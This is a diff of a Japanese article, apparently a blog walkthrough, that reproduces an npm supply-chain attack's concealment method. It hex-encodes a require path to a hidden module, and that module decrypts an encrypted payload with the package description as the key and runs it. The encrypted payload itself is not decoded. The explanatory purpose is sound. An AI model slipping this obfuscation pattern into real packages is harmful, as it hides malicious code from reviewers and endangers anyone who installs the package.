@@ -56,33 +56,38 @@ encoded;
 
 ### index.ts
 
-正常なコードを書いたファイルを index.ts。攻撃コードを忍ばせ、攻撃を実行するコードを書いたファイルを evil.ts とします。
-まずは index.ts から evil.ts を require します。evil() の実行が攻撃コードの実行になります。
+正常なコードを書いたファイルを index.ts。攻撃コードを忍ばせ、攻撃を実行するコードを書いたファイルを data.ts とします。
+まずは index.ts から data.ts を require します。ただしトランスパイルされるので実際のファイル名は`./data.js`ですね。これの default の実行が攻撃コードの実行になります。
 
 ```ts
 export default () => {
-  const evil = require("./evil.ts").default;
-  evil();
+  require("./data.js").default();
   console.log("This is good code.");
 };
 ```
 
-今回はこの require の中の文字列が hex エンコードされていました。./evil.ts をエンコードすると`2E2F6576696C`になります。
-require の中にデコード処理を入れて書き換えます。
+今回はこの require の中の文字列が hex エンコードされていました。なので`./data.js`もエンコードしましょう。
+ここでも node でちゃっとやってしまいます。
+
+```js
+Buffer.from("./data.js").toString("hex");
+// '2e2f646174612e6a73'
+```
+
+結果は`2e2f646174612e6a73`になりました。これを require の中にデコード処理を入れて書き換えます。
 
 ```ts
 export default () => {
-  const evil = require(Buffer.from("2E2F6576696C", "hex").toString()).default;
-  evil();
+  require(Buffer.from("2e2f646174612e6a73", "hex").toString()).default();
   console.log("This is good code.");
 };
 ```
 
 一見して何のファイルが読み込まれているかわからなくなりましたね。
 
-### evil.ts
+### data.ts
 
-次に evil.ts の用意です。この中で暗号化したコードの複合と実行を行います。
+次に data.ts の用意です。この中で暗号化したコードの複合と実行を行います。
 暗号化された攻撃コードは`cfdc36e155f1213c266810ac757ceb743e036c6aa08703d564010029511c7af099387eb23604e1b308233f4eba23dd0f`。
 これを実行パッケージの package.json の description を格納している`process.env.npm_package_description`で復号し、それを実行してやります。
 
